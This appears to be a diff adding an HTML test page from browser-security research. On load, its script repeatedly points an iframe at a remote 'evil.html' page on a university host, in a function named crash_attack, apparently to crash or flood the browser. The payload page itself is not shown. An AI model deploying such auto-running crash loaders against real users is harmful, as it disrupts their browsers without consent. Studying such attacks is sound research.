@@ -1,0 +1,44 @@
+<html>
+
+    <body>
+        <h1><div id="page"></div></h1>
+        <iframe id="main_iframe" src=""
+            style="height:90vh;width:95vw">
+        
+        </iframe>
+
+
+        <script>
+            //https://stackoverflow.com/questions/951021/what-is-the-javascript-version-of-sleep
+            function sleep(milliseconds) {
+                const date = Date.now();
+                let currentDate = null;
+                do {
+                    currentDate = Date.now();
+                } while (currentDate - date < milliseconds);
+            }
+
+
+            async function crash_attack(){
+                for (let index = 0; index < 30; index++) {
+                    document.getElementById("main_iframe").src = `https://cups.cs.cmu.edu/rightnow/bs/queue_crash_copy/evil.html?index=${index}`;
+
+
+                }
+            }
+
+
+
+            crash_attack()
+            
+
+            
+        </script>
+        <br>
+        
+
+        
+
+    </body>
+
+</html>
